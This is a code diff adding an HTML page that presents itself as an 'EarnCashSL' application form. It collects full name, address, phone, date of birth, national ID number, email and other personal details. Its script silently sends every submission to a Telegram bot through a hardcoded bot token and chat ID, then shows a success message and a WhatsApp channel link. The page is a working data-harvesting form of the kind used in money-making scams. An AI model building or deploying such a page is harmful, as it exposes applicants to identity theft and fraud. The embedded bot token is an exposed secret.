@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>EarnCashSL Application</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    form { max-width: 400px; margin: auto; display: flex; flex-direction: column; }
+    input, select, button { margin: 8px 0; padding: 10px; font-size: 14px; }
+    button { background: #28a745; color: white; border: none; cursor: pointer; }
+    button:hover { background: #218838; }
+    #popup { display: none; text-align: center; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h2>EarnCashSL Application Form</h2>
+  <form id="appForm">
+    <input type="text" name="fullName" placeholder="Full Name" required>
+    <input type="text" name="address" placeholder="Address" required>
+    <input type="text" name="phone" placeholder="Phone Number" required>
+    <input type="date" name="dob" required>
+    <input type="text" name="idCard" placeholder="ID Card Number" required>
+    <input type="email" name="email" placeholder="Email" required>
+    <select name="status" required>
+      <option value="">Select Status</option>
+      <option>Single</option>
+      <option>Married</option>
+      <option>Divorced</option>
+    </select>
+    <input type="text" name="device" placeholder="Mobile Device Name">
+    <input type="text" name="preferences" placeholder="Preferences (e.g., App Review)">
+    <input type="text" name="socialMedia" placeholder="Social Media Availability">
+    <input type="text" name="referral" placeholder="Referral Number">
+    <button type="submit">Submit for Review</button>
+  </form>
+
+  <div id="popup">
+    <h3>Your application has been sent successfully!</h3>
+    <a href="https://whatsapp.com/channel/0029VaQTQUwDp2Q6VBC1u22t" target="_blank">
+      Join WhatsApp Channel
+    </a>
+  </div>
+
+  <script>
+    const BOT_ID = "8132418702:AAFC0LoHjk7to1qhMSM1qCkJX3eK3M0yU0g";
+    const CHAT_ID = "5048384244";
+
+    document.getElementById("appForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const form = e.target;
+      const data = {
+        fullName: form.fullName.value,
+        address: form.address.value,
+        phone: form.phone.value,
+        dob: form.dob.value,
+        idCard: form.idCard.value,
+        email: form.email.value,
+        status: form.status.value,
+        device: form.device.value,
+        preferences: form.preferences.value,
+        socialMedia: form.socialMedia.value,
+        referral: form.referral.value
+      };
+
+      await fetch(`https://api.telegram.org/bot${BOT_ID}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `📋 New Application:\nName: ${data.fullName}\nAddress: ${data.address}\nPhone: ${data.phone}\nDOB: ${data.dob}\nID: ${data.idCard}\nEmail: ${data.email}\nStatus: ${data.status}\nDevice: ${data.device}\nPreferences: ${data.preferences}\nSocial Media: ${data.socialMedia}\nReferral: ${data.referral}`
+        })
+      });
+
+      document.getElementById("appForm").style.display = "none";
+      document.getElementById("popup").style.display = "block";
+    });
+  </script>
+</body>
+</html>
